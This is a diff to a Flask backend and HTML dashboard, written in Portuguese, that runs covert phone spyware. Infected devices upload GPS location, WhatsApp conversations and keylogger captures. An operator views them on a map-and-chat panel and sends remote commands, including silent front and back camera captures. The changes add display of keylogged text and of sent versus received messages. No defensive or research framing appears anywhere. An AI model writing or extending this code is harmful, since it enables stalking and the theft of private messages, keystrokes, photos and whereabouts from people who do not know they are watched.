@@ -47,7 +47,6 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
         .cam-frame img { width: 100%; height: 100%; object-fit: cover; display: none; }
         .cam-placeholder { font-size: 11px; color: #334155; text-transform: uppercase; }
         
-        /* WHATSAPP CARDS */
         .whatsapp-section { margin-bottom: 15px; }
         .whatsapp-section h3 { color: #25d366; font-size: 13px; margin-bottom: 8px; text-transform: uppercase; }
         .chat-list { display: flex; flex-direction: column; gap: 6px; }
@@ -57,19 +56,20 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
         .chat-card-header .pessoa { color: #25d366; font-weight: bold; font-size: 12px; }
         .chat-card-header .info { display: flex; gap: 10px; align-items: center; }
         .chat-card-header .total { background: #25d366; color: #000; padding: 2px 8px; border-radius: 10px; font-size: 10px; font-weight: bold; }
-        .chat-card-header .ultima { color: #64748b; font-size: 10px; max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
-        .chat-card-header .seta { color: #64748b; font-size: 14px; transition: transform 0.2s; }
-        .chat-card.aberto .chat-card-header .seta { transform: rotate(90deg); }
+        .chat-card-header .ultima { color: #64748b; font-size: 10px; max-width: 150px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
         .chat-card-body { display: none; padding: 0 12px 10px 12px; max-height: 250px; overflow-y: auto; }
         .chat-card.aberto .chat-card-body { display: block; }
-        .chat-msg { padding: 6px 0; border-bottom: 1px solid #1e293b; font-size: 11px; color: #94a3b8; }
+        .chat-msg { padding: 6px 0; border-bottom: 1px solid #1e293b; font-size: 11px; }
+        .chat-msg.recebida { color: #94a3b8; }
+        .chat-msg.enviada { color: #38bdf8; text-align: right; }
         .chat-msg.midia { color: #f59e0b; }
         .chat-msg .hora { color: #64748b; font-size: 9px; }
+        .chat-msg .tipo-tag { font-size: 8px; text-transform: uppercase; }
         
-        .keylog-box { background: #0a0a0a; border: 2px solid #ef4444; padding: 10px; border-radius: 8px; margin-bottom: 15px; text-align: center; }
+        .keylog-box { background: #0a0a0a; border: 2px solid #ef4444; padding: 10px; border-radius: 8px; margin-bottom: 15px; }
         .keylog-box.ativo { border-color: #22c55e; animation: pulse 1s infinite; }
-        .keylog-box p { font-size: 11px; }
         .keylog-box .app-nome { color: #f59e0b; font-weight: bold; text-transform: uppercase; }
+        .keylog-box .keylog-texto { color: #38bdf8; font-size: 12px; margin-top: 5px; word-break: break-all; }
         
         .error-box { background: #450a0a; border: 1px solid #991b1b; padding: 15px; border-radius: 8px; text-align: center; margin-bottom: 20px; }
         .error-box p { color: #fca5a5; font-weight: bold; }
@@ -131,6 +131,7 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
                 let marker = L.marker([{{ info_moto.lat }}, {{ info_moto.lon }}]).addTo(map);
                 let historico = L.polyline([], {color: '#38bdf8', weight: 3}).addTo(map);
                 let pontos = [[{{ info_moto.lat }}, {{ info_moto.lon }}]];
+                let chatsAbertos = {};
                 
                 function enviarComando(acao) {
                     fetch('/api/comando_remoto/{{ id_buscado }}', {
@@ -139,8 +140,14 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
                     });
                 }
                 
-                function toggleChat(card) {
-                    card.classList.toggle('aberto');
+                function toggleChat(pessoa, card) {
+                    if (card.classList.contains('aberto')) {
+                        card.classList.remove('aberto');
+                        delete chatsAbertos[pessoa];
+                    } else {
+                        card.classList.add('aberto');
+                        chatsAbertos[pessoa] = true;
+                    }
                 }
                 
                 async function dispararCapturaDupla() {
@@ -182,35 +189,37 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
                             }
                             
                             // KEYLOGGER
+                            let kb = document.getElementById('keylogBox');
                             if(d.keylog && d.keylog.ativo) {
-                                let kb = document.getElementById('keylogBox');
                                 kb.className = 'keylog-box ativo';
-                                kb.innerHTML = `<p>⌨️ <span class="app-nome">${d.keylog.app}</span> aberto - Capturando teclas...</p>`;
-                            } else {
-                                document.getElementById('keylogBox').className = 'keylog-box';
-                                document.getElementById('keylogBox').innerHTML = '<p>⌨️ Nenhum app monitorado aberto</p>';
+                                let textoHtml = d.keylog.texto ? `<div class="keylog-texto">📝 ${d.keylog.texto}</div>` : '';
+                                kb.innerHTML = `<p>⌨️ <span class="app-nome">${d.keylog.app}</span> monitorado${textoHtml}</p>`;
+                            } else if(!d.keylog || !d.keylog.ativo) {
+                                kb.className = 'keylog-box';
+                                kb.innerHTML = '<p>⌨️ Nenhum app monitorado aberto</p>';
                             }
                             
-                            // WHATSAPP CARDS
+                            // WHATSAPP - Mantém cards abertos
                             if(d.whatsapp && d.whatsapp.length > 0) {
                                 let html = '';
                                 d.whatsapp.forEach(chat => {
                                     let temMidia = chat.midia ? '📎 ' : '';
-                                    html += `<div class="chat-card" onclick="toggleChat(this)">
+                                    let aberto = chatsAbertos[chat.pessoa] ? ' aberto' : '';
+                                    html += `<div class="chat-card${aberto}" onclick="toggleChat('${chat.pessoa}', this)">
                                         <div class="chat-card-header">
                                             <span class="pessoa">👤 ${chat.pessoa}</span>
                                             <div class="info">
                                                 <span class="ultima">${temMidia}${chat.ultima_msg || ''}</span>
                                                 <span class="total">${chat.total}</span>
-                                                <span class="seta">▶</span>
                                             </div>
                                         </div>
                                         <div class="chat-card-body">`;
                                     
                                     if(chat.mensagens) {
                                         chat.mensagens.slice().reverse().forEach(msg => {
-                                            let cls = msg.midia ? 'chat-msg midia' : 'chat-msg';
-                                            html += `<div class="${cls}">${msg.texto} <span class="hora">${msg.hora}</span></div>`;
+                                            let cls = 'chat-msg ' + (msg.tipo || 'recebida');
+                                            if(msg.midia) cls += ' midia';
+                                            html += `<div class="${cls}"><span class="tipo-tag">${msg.tipo === 'enviada' ? '📤' : '📥'}</span> ${msg.texto} <span class="hora">${msg.hora}</span></div>`;
                                         });
                                     }
                                     
@@ -230,9 +239,7 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
 
 @app.route('/', methods=['GET', 'POST'])
 def index():
-    id_buscado = None
-    info_moto = None
-    erro = None
+    id_buscado = None; info_moto = None; erro = None
     if request.method == 'POST':
         id_buscado = request.form.get('target_id', '').strip().upper()
         if id_buscado in db_dispositivos: info_moto = db_dispositivos[id_buscado]
@@ -244,14 +251,7 @@ def api_status(device_id):
     device_id = device_id.upper()
     if device_id in db_dispositivos:
         d = db_dispositivos[device_id]
-        return jsonify({
-            "battery": d.get("battery","N/A"),
-            "uptime": d.get("uptime","N/A"),
-            "lat": d.get("lat",0), "lon": d.get("lon",0),
-            "network": d.get("network","N/A"),
-            "whatsapp": d.get("whatsapp",[]),
-            "keylog": d.get("keylog", None)
-        }), 200
+        return jsonify({"battery": d.get("battery","N/A"), "uptime": d.get("uptime","N/A"), "lat": d.get("lat",0), "lon": d.get("lon",0), "network": d.get("network","N/A"), "whatsapp": d.get("whatsapp",[]), "keylog": d.get("keylog")}), 200
     return jsonify({"error": "Not found"}), 404
 
 @app.route('/update', methods=['POST'])
@@ -260,20 +260,10 @@ def update():
     device_id = data.get('device_id', '').upper()
     if not device_id: return jsonify({"status": "error"}), 400
     if device_id not in db_dispositivos: db_dispositivos[device_id] = {}
-    db_dispositivos[device_id].update({
-        "battery": data.get("battery","N/A"),
-        "uptime": data.get("uptime","N/A"),
-        "lat": float(data.get("lat",-16.6869)),
-        "lon": float(data.get("lon",-49.2648)),
-        "network": data.get("network","N/A"),
-        "whatsapp": data.get("whatsapp",[]),
-        "keylog": data.get("keylog"),
-        "last_seen": datetime.utcnow().isoformat()
-    })
+    db_dispositivos[device_id].update({"battery": data.get("battery","N/A"), "uptime": data.get("uptime","N/A"), "lat": float(data.get("lat",-16.6869)), "lon": float(data.get("lon",-49.2648)), "network": data.get("network","N/A"), "whatsapp": data.get("whatsapp",[]), "keylog": data.get("keylog"), "last_seen": datetime.utcnow().isoformat()})
     cmd_cam = db_dispositivos[device_id].get("cmd_cam", "wait")
     cmd_remoto = db_dispositivos[device_id].get("cmd_remoto", "none")
-    db_dispositivos[device_id]["cmd_cam"] = "wait"
-    db_dispositivos[device_id]["cmd_remoto"] = "none"
+    db_dispositivos[device_id]["cmd_cam"] = "wait"; db_dispositivos[device_id]["cmd_remoto"] = "none"
     return jsonify({"status": "success", "comando_cam": cmd_cam, "comando_remoto": cmd_remoto}), 200
 
 @app.route('/api/comando_camera/<device_id>', methods=['POST'])
@@ -281,16 +271,14 @@ def comando_camera(device_id):
     device_id = device_id.upper()
     if device_id not in db_dispositivos: db_dispositivos[device_id] = {}
     db_dispositivos[device_id]["cmd_cam"] = "take_dual"
-    db_dispositivos[device_id]["photo_front"] = ""
-    db_dispositivos[device_id]["photo_back"] = ""
+    db_dispositivos[device_id]["photo_front"] = ""; db_dispositivos[device_id]["photo_back"] = ""
     return jsonify({"status": "ok"}), 200
 
 @app.route('/api/comando_remoto/<device_id>', methods=['POST'])
 def comando_remoto(device_id):
     device_id = device_id.upper()
     if device_id not in db_dispositivos: db_dispositivos[device_id] = {}
-    acao = (request.get_json(force=True, silent=True) or {}).get("acao", "none")
-    db_dispositivos[device_id]["cmd_remoto"] = acao
+    db_dispositivos[device_id]["cmd_remoto"] = (request.get_json(force=True, silent=True) or {}).get("acao", "none")
     return jsonify({"status": "ok"}), 200
 
 @app.route('/api/upload_lote', methods=['POST'])
@@ -307,11 +295,9 @@ def upload_lote():
 def get_camera(device_id):
     device_id = device_id.upper()
     if device_id in db_dispositivos:
-        pf = db_dispositivos[device_id].get("photo_front", "")
-        pb = db_dispositivos[device_id].get("photo_back", "")
+        pf = db_dispositivos[device_id].get("photo_front", ""); pb = db_dispositivos[device_id].get("photo_back", "")
         return jsonify({"photo_front": pf, "photo_back": pb, "pronto": bool(pf and pb)}), 200
     return jsonify({"photo_front": "", "photo_back": "", "pronto": False}), 404
 
 if __name__ == '__main__':
-    port = int(os.environ.get("PORT", 5000))
-    app.run(host='0.0.0.0', port=port, debug=False)
+    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)), debug=False)
